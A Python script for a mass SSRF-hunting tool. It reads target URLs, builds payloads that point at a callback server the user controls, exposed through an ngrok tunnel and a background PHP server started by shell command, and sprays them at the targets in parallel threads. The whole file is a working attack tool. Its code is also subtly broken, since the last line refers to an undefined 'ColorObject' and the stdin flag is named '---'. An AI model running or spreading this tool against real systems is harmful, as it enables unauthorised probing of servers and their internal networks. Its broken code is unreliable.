#!/usr/bin/python3

from os import system
from pyngrok import ngrok
from termcolor import colored
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor 

from lib.Engine import Engine
from lib.Functions import starter
from lib.PathFunctions import PathFunction
from lib.Globals import ColorObj, port

parser = ArgumentParser(description=colored("Mass hunt SSRF", color='yellow'), epilog=colored("Check your server logs", color='yellow'))
input_group = parser.add_mutually_exclusive_group()
server_group = parser.add_mutually_exclusive_group()
input_group.add_argument("---", "---", dest="stdin", action="store_true", help="Stdin")
input_group.add_argument("-w", "--wordlist", type=str, help="Absolute path to wordlist")
input_group.add_argument("-u", "--url", type=str, help="Url")
server_group.add_argument("-s", "--server", type=str, help="Server name")
server_group.add_argument("-a", "--auto", type=str, help="Server path")
parser.add_argument("-t", "--threads", type=int, help="No. of threads")
parser.add_argument("-b", "--banner", action="store_true", help="Print banner and exit")
argv = parser.parse_args()

input_wordlist = starter(argv)
engine = Engine()
path_fn = PathFunction()

def main():
    if argv.server:
        p = engine.generate_payloads(input_wordlist, path_fn.urler(argv.server))
    elif argv.auto:
        if ',' in argv.auto:
            server_path, public_path = argv.auto.split(',')
            public_url = path_fn.unslasher(path_fn.slasher(ngrok.connect(port = port)) + path_fn.payloader(public_path))
            system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
            print(f"{ColorObj.information} URL generated: {public_url} ")
        else:
            server_path = argv.auto
            public_url = path_fn.unslasher(ngrok.connect(port = port))
            system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
            print(f"{ColorObj.information} URL generated: {public_url} ")
        p = engine.generate_payloads(input_wordlist, path_fn.urler(public_url))
    s = [payload for payload_list in p for payload in payload_list]
    with ThreadPoolExecutor(max_workers=argv.threads) as submitter:
        futures_objects = [submitter.submit(engine.try_payload, i) for i in s]
    print(f"{ColorObject.good} Success. Check your server logs for bounty!")

if __name__ == "__main__":
    main()
